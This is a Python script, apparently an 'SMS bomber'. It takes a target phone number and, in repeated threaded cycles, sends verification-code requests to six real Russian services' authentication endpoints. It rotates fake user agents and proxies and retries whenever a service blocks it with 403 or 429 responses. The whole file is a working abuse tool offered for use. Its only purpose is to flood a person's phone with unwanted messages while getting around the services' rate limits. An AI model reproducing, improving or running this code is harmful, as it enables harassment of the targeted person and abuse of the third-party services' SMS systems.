import requests
import time
import argparse
import random
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent

ua = UserAgent()

WORKING_APIS = {
    "DNS_Old": {
        "url": "https://www.dns-shop.ru/auth/auth/fast-authorization/",
        "method": "POST",
        "data": {"FastAuthorizationLoginLoadForm[login]": "{phone}"},
        "headers": {"Origin": "https://www.dns-shop.ru", "Referer": "https://www.dns-shop.ru/"}
    },
    "Utair": {
        "url": "https://b.utair.ru/api/v1/login/",
        "method": "POST",
        "data": {"login": "{phone}"},
        "headers": {"Origin": "https://www.utair.ru", "Referer": "https://www.utair.ru/"}
    },
    "Lenta": {
        "url": "https://lenta.com/api/v1/authentication/requestValidationCode",
        "method": "POST",
        "json": {"phone": "+{phone}"},
        "headers": {"Origin": "https://lenta.com", "Referer": "https://lenta.com/"}
    },
    "Youla": {
        "url": "https://youla.ru/web-api/auth/request_code",
        "method": "POST",
        "data": {"phone": "{phone}"},
        "headers": {"Origin": "https://youla.ru", "Referer": "https://youla.ru/"}
    },
    "Yandex_Eda": {
        "url": "https://eda.yandex/api/v1/user/request_authentication_code",
        "method": "POST",
        "json": {"phone_number": "+{phone}"},
        "headers": {"Origin": "https://eda.yandex", "Referer": "https://eda.yandex/"}
    },
    "ICQ": {
        "url": "https://u.icq.net/api/v90/smsreg/requestPhoneValidation.php",
        "method": "POST",
        "data": {
            "msisdn": "+{phone}",
            "locale": "en",
            "countryCode": "ru",
            "version": "1",
            "k": "ic1rtwz1s1Hj1O0r",
            "r": "46763"
        }
    }
}

def load_working_proxies(filename="working_proxies.txt"):
    try:
        with open(filename, "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    except FileNotFoundError:
        return []

def send_sms(service_name, api_data, phone, proxy_pool):
    url = api_data["url"]
    method = api_data.get("method", "POST")
    
    data = {}
    if "data" in api_data:
        for k, v in api_data["data"].items():
            data[k] = v.replace("{phone}", phone) if isinstance(v, str) else v
            
    json_data = {}
    if "json" in api_data:
        for k, v in api_data["json"].items():
            json_data[k] = v.replace("{phone}", phone) if isinstance(v, str) else v

    headers = {
        "User-Agent": ua.random,
        "Accept": "application/json, text/plain, */*"
    }
    headers.update(api_data.get("headers", {}))

    attempts = 0
    max_attempts = 3
    success = False

    while attempts < max_attempts and not success:
        attempts += 1
        proxy = None
        proxy_str = "Direct"
        
        if proxy_pool and attempts <= 2:
            p = random.choice(proxy_pool)
            proxy_str = p
            proxy = {"http": f"http://{p}", "https": f"http://{p}"}

        try:
            if method == "POST":
                if json_data:
                    r = requests.post(url, json=json_data, headers=headers, proxies=proxy, timeout=8)
                else:
                    r = requests.post(url, data=data, headers=headers, proxies=proxy, timeout=8)
            
            if r.status_code in [200, 201, 202, 204]:
                print(f"[+] OK: {service_name} ({r.status_code}) | Proxy: {proxy_str}")
                success = True
            elif r.status_code in [403, 429]:
                print(f"[-] BLOCKED {r.status_code}: {service_name} | Proxy: {proxy_str}. Retrying...")
            else:
                print(f"[-] FAIL: {service_name} ({r.status_code}) | Proxy: {proxy_str}")
                success = True
                
        except Exception as e:
            print(f"[!] ERR: {service_name} - {type(e).__name__} | Proxy: {proxy_str}")

    if not success:
        print(f"[X] Could not send {service_name}.")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--phone", required=True)
    parser.add_argument("-c", "--count", type=int, default=1)
    args = parser.parse_args()

    phone = args.phone
    if phone.startswith("+"):
        phone = phone[1:]

    proxy_pool = load_working_proxies()

    print(f"\n[*] Target: {phone}")
    print(f"[*] APIs: {len(WORKING_APIS)}")
    print(f"[*] Cycles: {args.count}")
    print(f"[*] Proxies in pool: {len(proxy_pool)}\n")

    try:
        for i in range(args.count):
            print(f"--- Cycle {i+1} ---")
            with ThreadPoolExecutor(max_workers=len(WORKING_APIS)) as executor:
                for name, api_data in WORKING_APIS.items():
                    executor.submit(send_sms, name, api_data, phone, proxy_pool)
            
            if i < args.count - 1:
                time.sleep(5)
                
    except KeyboardInterrupt:
        print("\n[*] Stopped.")

if __name__ == "__main__":
    main()
